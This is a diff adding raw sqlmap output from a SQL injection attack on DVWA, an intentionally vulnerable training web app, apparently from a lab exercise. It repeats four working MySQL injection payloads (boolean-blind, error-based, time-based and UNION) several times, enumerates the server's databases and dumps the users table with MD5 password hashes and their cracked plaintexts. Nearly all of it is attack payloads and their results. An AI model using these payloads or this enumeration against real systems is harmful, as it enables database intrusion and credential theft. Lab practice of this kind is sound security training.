@@ -1,0 +1,190 @@
+sqlmap identified the following injection point(s) with a total of 152 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=123' OR NOT 7569=7569#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=123' OR (SELECT 5510 FROM(SELECT COUNT(*),CONCAT(0x71786a6271,(SELECT (ELT(5510=5510,1))),0x71716a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SpYA&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=123' AND (SELECT 3682 FROM (SELECT(SLEEP(5)))lLGJ)-- ddKO&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=123' UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x4c6254644c5265467a6e7847496641484151554859564d67694272724447476f4957495341735045,0x71716a6271)#&Submit=Submit
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62, PHP 8.4.4
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=123' OR NOT 7569=7569#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=123' OR (SELECT 5510 FROM(SELECT COUNT(*),CONCAT(0x71786a6271,(SELECT (ELT(5510=5510,1))),0x71716a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SpYA&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=123' AND (SELECT 3682 FROM (SELECT(SLEEP(5)))lLGJ)-- ddKO&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=123' UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x4c6254644c5265467a6e7847496641484151554859564d67694272724447476f4957495341735045,0x71716a6271)#&Submit=Submit
+---
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=123' OR NOT 7569=7569#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=123' OR (SELECT 5510 FROM(SELECT COUNT(*),CONCAT(0x71786a6271,(SELECT (ELT(5510=5510,1))),0x71716a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SpYA&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=123' AND (SELECT 3682 FROM (SELECT(SLEEP(5)))lLGJ)-- ddKO&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=123' UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x4c6254644c5265467a6e7847496641484151554859564d67694272724447476f4957495341735045,0x71716a6271)#&Submit=Submit
+---
+web server operating system: Linux Debian
+web application technology: PHP 8.4.4, Apache 2.4.62
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: information_schema
+[79 tables]
++---------------------------------------+
+| ALL_PLUGINS                           |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CHECK_CONSTRAINTS                     |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| ENABLED_ROLES                         |
+| FILES                                 |
+| GEOMETRY_COLUMNS                      |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_SYS_VIRTUAL                    |
+| INNODB_TABLESPACES_ENCRYPTION         |
+| INNODB_TRX                            |
+| KEYWORDS                              |
+| KEY_CACHES                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| SPATIAL_REF_SYS                       |
+| SQL_FUNCTIONS                         |
+| STATISTICS                            |
+| SYSTEM_VARIABLES                      |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| THREAD_POOL_GROUPS                    |
+| THREAD_POOL_QUEUES                    |
+| THREAD_POOL_STATS                     |
+| THREAD_POOL_WAITS                     |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| ENGINES                               |
+| EVENTS                                |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| TABLES                                |
+| TRIGGERS                              |
+| user_variables                        |
++---------------------------------------+
+
+Database: dvwa
+[2 tables]
++---------------------------------------+
+| guestbook                             |
+| users                                 |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=123' OR NOT 7569=7569#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=123' OR (SELECT 5510 FROM(SELECT COUNT(*),CONCAT(0x71786a6271,(SELECT (ELT(5510=5510,1))),0x71716a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SpYA&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=123' AND (SELECT 3682 FROM (SELECT(SLEEP(5)))lLGJ)-- ddKO&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=123' UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x4c6254644c5265467a6e7847496641484151554859564d67694272724447476f4957495341735045,0x71716a6271)#&Submit=Submit
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62, PHP 8.4.4
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2025-03-15 06:01:43 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2025-03-15 06:01:43 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2025-03-15 06:01:43 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2025-03-15 06:01:43 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2025-03-15 06:01:43 | 0            |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+
